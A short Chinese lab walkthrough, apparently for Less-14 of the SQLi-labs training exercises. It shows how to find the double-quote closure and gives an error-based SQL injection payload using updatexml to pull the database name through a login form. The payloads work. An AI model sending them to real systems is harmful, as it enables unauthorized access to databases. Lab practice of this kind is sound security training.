---
title: Less - 14
date: 2023-03-14T14:20:53Z
lastmod: 2023-03-14T14:26:06Z
---

# Less - 14

---

# 通关教程

---

## 1、判断闭合

---

```html
uname=admin'&passwd=admin&submit=Submit #无错误显示
uname=admin"&passwd=admin&submit=Submit #有完整错误显示
```

​![image](assets/image-20230314142315-se6t63u.png)​

​![image](assets/image-20230314142330-y8h4i30.png)​

---

## 2、查看当前数据库

---

```html
uname=a" or updatexml(1,concat(0x7e,(database()),0x7e),1)#&passwd=admin&submit=Submit
```

​![image](assets/image-20230314142525-8knbzex.png)​

具体过程参考less13，只是闭合方式不一样
